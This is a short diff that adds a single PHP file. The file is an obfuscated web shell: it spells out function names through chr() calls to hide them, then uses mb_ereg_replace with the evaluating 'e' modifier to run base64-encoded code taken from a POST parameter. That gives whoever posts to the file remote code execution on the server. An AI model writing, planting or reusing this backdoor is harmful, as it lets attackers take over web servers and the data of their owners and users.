@@ -1,0 +1,1 @@
+<?php function css($s){$cs = "c"."hr";return $cs($s);}$a=css(46).css(42);$b=css(98).css(97).css(115).css(101).css(54).css(52).css(95).css(100).css(101).css(99).css(111).css(100).css(101);$c = css(109).css(98).css(95).css(101).css(114).css(101).css(103).css(95).css(114).css(101).css(112).css(108).css(97).css(99).css(101);$s = ${_POST};$d = css(101);$c($a, $b($s['1']),0, $d);
